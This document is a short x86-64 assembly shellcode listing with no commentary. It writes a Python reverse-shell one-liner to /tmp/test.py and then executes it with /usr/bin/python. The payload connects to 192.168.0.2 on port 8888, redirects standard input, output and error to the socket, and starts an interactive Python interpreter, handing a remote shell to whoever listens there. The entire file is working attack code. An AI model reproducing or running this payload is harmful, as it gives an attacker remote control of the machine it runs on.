section .text
    global _start
_start:
	call openfile
	FILENAME db "/tmp/test.py", 0x00

writefile:
	mov    rdx,	0xf0        
	pop    rsi    
	mov    rdi,rcx        
	mov    eax,0x1
	syscall
	push 0
	call getprocname
	CMD db "/tmp/test.py", 0x00

getprocname:
	call closefile
	PROCN db "python", 0x00

closefile:
	mov    rdi,rcx    
	mov    eax,0x3
	syscall
	call runexec
	PROG db "/usr/bin/python", 0x00

runexec:
	mov    eax,0x3b
	mov    rdi,QWORD [rsp]
	lea    rsi, [rsp + 8]
	xor    edx,edx	
	syscall

  mov rax, 0x3c
  mov rdi, 0
  syscall

openfile:
  pop    rdi
	mov    esi,0x241
	mov    edx,0x1b6
	mov    eax,0x2
	syscall
	mov    rcx,rax
	call writefile
  CONTENT db "import socket;from subprocess import call; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.2',8888)); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);call(['/usr/bin/python','-i']);", 0x00
